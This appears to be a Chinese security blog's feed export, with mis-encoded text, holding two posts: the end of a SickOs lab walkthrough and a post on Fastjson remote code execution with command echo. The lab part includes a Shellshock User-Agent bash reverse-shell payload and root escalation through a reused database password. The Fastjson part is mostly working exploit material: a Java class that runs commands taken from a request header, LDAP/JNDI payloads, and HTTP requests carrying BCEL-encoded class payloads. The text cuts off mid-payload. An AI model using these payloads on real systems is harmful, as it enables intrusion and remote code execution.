æ³•æ‰§è¡Œï¼Œåç»­ä½¿ç”¨å†°èä¸Šä¼ weblshellè¿æ¥ï¼›</p><h3 id="2ã€åˆ©ç”¨å†°èä¸Šä¼ weblshellè¿æ¥"><a href="#2ã€åˆ©ç”¨å†°èä¸Šä¼ weblshellè¿æ¥" class="headerlink" title="2ã€åˆ©ç”¨å†°èä¸Šä¼ weblshellè¿æ¥"></a>2ã€åˆ©ç”¨å†°èä¸Šä¼ weblshellè¿æ¥</h3><p>è¿™é‡Œå¿…é¡»é…ç½®å¥½ä»£ç†æ‰å¯ä»¥æ­£å¸¸è¿æ¥webshellï¼›</p><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619370.png" alt="img"></h4><h2 id="Shellshock-Bash-åå‘-Shell"><a href="#Shellshock-Bash-åå‘-Shell" class="headerlink" title="Shellshock Bash åå‘ Shell"></a>Shellshock Bash åå‘ Shell</h2><p>Burp Suite ç”¨äºæ“ä½œ User-Agentï¼šåŒ…æ‹¬ bash åå‘ shellã€‚</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> ignored<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">/</span>bin/bash <span class="token operator">-</span>i >&amp; <span class="token operator">/</span>dev/tcp/192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>221<span class="token punctuation">.</span>139/443 0>&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619992.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619018.png" alt="img"></p><p>æŸ¥çœ‹/var/www/wolfcms/ç›®å½•ä¸‹çš„config.phpæ–‡ä»¶ï¼›</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token operator">/</span><span class="token operator">/</span> Database settings:<span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'DB_DSN'</span><span class="token punctuation">,</span> <span class="token string">'mysql:dbname=wolf;host=localhost;port=3306'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'DB_USER'</span><span class="token punctuation">,</span> <span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'DB_PASS'</span><span class="token punctuation">,</span> <span class="token string">'john@123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'TABLE_PREFIX'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŸ¥çœ‹ç³»ç»Ÿå­˜åœ¨çš„å¯ç™»å½•è´¦æˆ·ï¼š</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620535.png" alt="img"></p><p>ä½¿ç”¨pythonä¸€å¥è¯è·å–æ ‡å‡†shell</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">python <span class="token operator">-</span>c <span class="token string">'import pty;pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620816.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620133.png" alt="img"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">www-<span class="token keyword">data</span>@SickOs:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www$ su <span class="token operator">-</span> sickossu <span class="token operator">-</span> sickosPassword: john@123sickos@SickOs:~$ <span class="token function">ls</span>     <span class="token function">ls</span>sickos@SickOs:~$ <span class="token function">cat</span> <span class="token punctuation">.</span>bash_history<span class="token function">cat</span> <span class="token punctuation">.</span>bash_historysudo su<span class="token keyword">exit</span>sickos@SickOs:~$ sudo susudo su<span class="token namespace">[sudo]</span> password <span class="token keyword">for</span> sickos: john@123root@SickOs:<span class="token operator">/</span>home/sickos<span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620364.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620177.png" alt="img"></p><p>æˆåŠŸè·å–åˆ°Flagï¼›</p><p>è‹¥æœ‰æ”¶è·ï¼Œå°±ç‚¹ä¸ªèµå§</p>]]></content>
      
      
      
        <tags>
            
            <tag> é¶æœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjsonå›æ˜¾</title>
      <link href="/2022/01/19/fastjson-hui-xian/"/>
      <url>/2022/01/19/fastjson-hui-xian/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191516424.png" alt="image-20191018154346759"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191518543.png" alt="image-20191018154515787"></p><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>1ã€å…ˆå¯åŠ¨ä¸€ä¸ªLDAPæœåŠ¡</p><pre class="line-numbers language-none"><code class="language-none">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127. 0.0.1:6666&#x2F;#Cat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2ã€å†å¯åŠ¨httpæœåŠ¡</p><pre class="line-numbers language-none"><code class="language-none">py -3 -m http.server --bind 127.0.0.1 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3ã€å†httpæœåŠ¡ä¸‹çš„ç›®å½•åˆ›å»ºä¸€ä¸ª<code>XXX.java</code>æ–‡ä»¶ ç„¶å<code>Javac XXX.java</code> æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">public class Cat &#123;    public Cat()throws Exception&#123;        boolean flag &#x3D; false;        ThreadGroup group &#x3D; Thread.currentThread().getThreadGroup();        java.lang.reflect.Field f &#x3D; group.getClass().getDeclaredField(&quot;threads&quot;);        f.setAccessible(true);        Thread[] threads &#x3D; (Thread[]) f.get(group);        for(int i &#x3D; 0; i &lt; threads.length; i++) &#123;            try&#123;                Thread t &#x3D; threads[i];                if (t &#x3D;&#x3D; null) continue;                String str &#x3D; t.getName();                if (str.contains(&quot;exec&quot;) || !str.contains(&quot;http&quot;)) continue;                f &#x3D; t.getClass().getDeclaredField(&quot;target&quot;);                f.setAccessible(true);                Object obj &#x3D; f.get(t);                if (!(obj instanceof Runnable)) continue;                f &#x3D; obj.getClass().getDeclaredField(&quot;this$0&quot;);                f.setAccessible(true);                obj &#x3D; f.get(obj);                try&#123;                    f &#x3D; obj.getClass().getDeclaredField(&quot;handler&quot;);                &#125;catch (NoSuchFieldException e)&#123;                    f &#x3D; obj.getClass().getSuperclass().getSuperclass().getDeclaredField(&quot;handler&quot;);                &#125;                f.setAccessible(true);                obj &#x3D; f.get(obj);                try&#123;                    f &#x3D; obj.getClass().getSuperclass().getDeclaredField(&quot;global&quot;);                &#125;catch(NoSuchFieldException e)&#123;                    f &#x3D; obj.getClass().getDeclaredField(&quot;global&quot;);                &#125;                f.setAccessible(true);                obj &#x3D; f.get(obj);                f &#x3D; obj.getClass().getDeclaredField(&quot;processors&quot;);                f.setAccessible(true);                java.util.List processors &#x3D; (java.util.List)(f.get(obj));                for(int j &#x3D; 0; j &lt; processors.size(); ++j) &#123;                    Object processor &#x3D; processors.get(j);                    f &#x3D; processor.getClass().getDeclaredField(&quot;req&quot;);                    f.setAccessible(true);                    Object req &#x3D; f.get(processor);                    Object resp &#x3D; req.getClass().getMethod(&quot;getResponse&quot;, new Class[0]).invoke(req, new Object[0]);                    str &#x3D; (String)req.getClass().getMethod(&quot;getHeader&quot;, new Class[]&#123;String.class&#125;).invoke(req, new Object[]&#123;&quot;cmd&quot;&#125;);                    if (str !&#x3D; null &amp;&amp; !str.isEmpty()) &#123;                        resp.getClass().getMethod(&quot;setStatus&quot;, new Class[]&#123;int.class&#125;).invoke(resp, new Object[]&#123;new Integer(200)&#125;);                        String[] cmds &#x3D; System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;&#x2F;c&quot;, str&#125; : new String[]&#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, str&#125;;                        String charsetName &#x3D; System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? &quot;GBK&quot;:&quot;UTF-8&quot;;                        byte[] result &#x3D; (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream(),charsetName)).useDelimiter(&quot;\\A&quot;).next().getBytes(charsetName);                        try &#123;                            Class cls &#x3D; Class.forName(&quot;org.apache.tomcat.util.buf.ByteChunk&quot;);                            obj &#x3D; cls.newInstance();                            cls.getDeclaredMethod(&quot;setBytes&quot;, new Class[]&#123;byte[].class, int.class, int.class&#125;).invoke(obj, new Object[]&#123;result, new Integer(0), new Integer(result.length)&#125;);                            resp.getClass().getMethod(&quot;doWrite&quot;, new Class[]&#123;cls&#125;).invoke(resp, new Object[]&#123;obj&#125;);                        &#125; catch (NoSuchMethodException var5) &#123;                            Class cls &#x3D; Class.forName(&quot;java.nio.ByteBuffer&quot;);                            obj &#x3D; cls.getDeclaredMethod(&quot;wrap&quot;, new Class[]&#123;byte[].class&#125;).invoke(cls, new Object[]&#123;result&#125;);                            resp.getClass().getMethod(&quot;doWrite&quot;, new Class[]&#123;cls&#125;).invoke(resp, new Object[]&#123;obj&#125;);                        &#125;                        flag &#x3D; true;                    &#125;                    if (flag) break;                &#125;                if (flag)  break;            &#125;catch(Exception e)&#123;                continue;            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4ã€payload ç›´æ¥å‘é€</p><pre class="line-numbers language-none"><code class="language-none">&#123;    &quot;a&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Cat&quot;,        &quot;autoCommit&quot;:&quot;true&quot;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5ã€ç›´æ¥å›æ˜¾</p><hr><h2 id="åŸºäºdbcpçš„fastjson-rce-å›æ˜¾"><a href="#åŸºäºdbcpçš„fastjson-rce-å›æ˜¾" class="headerlink" title="åŸºäºdbcpçš„fastjson rce å›æ˜¾"></a>åŸºäºdbcpçš„fastjson rce å›æ˜¾</h2><ul><li>fastjson &lt;= 1.2.24</li><li>1.2.33 &lt;= fastjson &lt;= 1.2.47</li><li>jdk &lt;= 8u251</li><li>å­˜åœ¨ tomcat-dbcp</li></ul><p>é¦–å…ˆå°†<code>AllEcho.java</code>ç¼–è¯‘ç”Ÿæˆ<code>AllEcho.class</code>æ–‡ä»¶ï¼Œç„¶åç”¨BCELEncode å¯¹class æ–‡ä»¶è¿›è¡Œbcelç¼–ç </p><ul><li>fastjson &lt;= 1.2.24 poc</li><li>è§£æä½¿ç”¨çš„JSON.parse()</li></ul><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;json HTTP&#x2F;1.1Host: 127.0.0.1:9092Content-Type: application&#x2F;jsoncmd: ver &amp;&amp; echo fastjsonContent-Length: 3327&#123;    &#123;        &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,        &quot;x&quot;:&#123;                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,                &quot;driverClassLoader&quot;: &#123;                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                &#125;,                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A&quot;        &#125;    &#125;: &quot;x&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„ä¿®æ”¹<code>Content-Type: application/json</code></p><ul><li>1.2.33 &lt;= fastjson &lt;= 1.2.47 poc</li><li>JSON.parseObject()</li><li>è¿˜éœ€è¦è°ƒç”¨toJSONString()</li><li>æ³¨æ„ä¿®æ”¹<code>Content-Type: application/json</code></li></ul><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;json HTTP&#x2F;1.1Host: 127.0.0.1:9092Content-Type: application&#x2F;jsoncmd: whoamiContent-Length: 3647&#123;    &quot;xx&quot;:    &#123;        &quot;@type&quot; : &quot;java.lang.Class&quot;,        &quot;val&quot;   : &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;    &#125;,    &quot;x&quot; : &#123;        &quot;name&quot;: &#123;            &quot;@type&quot; : &quot;java.lang.Class&quot;,            &quot;val&quot;   : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;        &#125;,        &#123;            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,            &quot;c&quot;: &#123;                &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,                &quot;driverClassLoader&quot;: &#123;                    &quot;@type&quot; : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                &#125;,                &quot;driverClassName&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$